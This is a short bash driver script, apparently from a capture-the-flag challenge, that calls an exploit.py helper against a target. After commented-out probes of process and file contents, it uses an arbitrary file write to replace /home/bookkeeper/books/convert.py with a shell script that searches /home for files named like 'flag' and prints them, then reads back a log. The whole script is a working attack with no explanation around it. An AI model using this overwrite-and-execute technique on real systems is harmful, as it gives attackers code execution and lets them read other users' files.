#!/usr/bin/env bash
python3 exploit.py reset
# python3 exploit.py cat /proc/self/cmdline
# python3 exploit.py cat /home/bookkeeper/books/convert.py
python3 exploit.py write /home/bookkeeper/books/convert.py $'#!/bin/sh\nfind /home -name \'*flag*\' -exec cat {} +\ntouch out-path.txt\nexit\n'
python3 exploit.py log
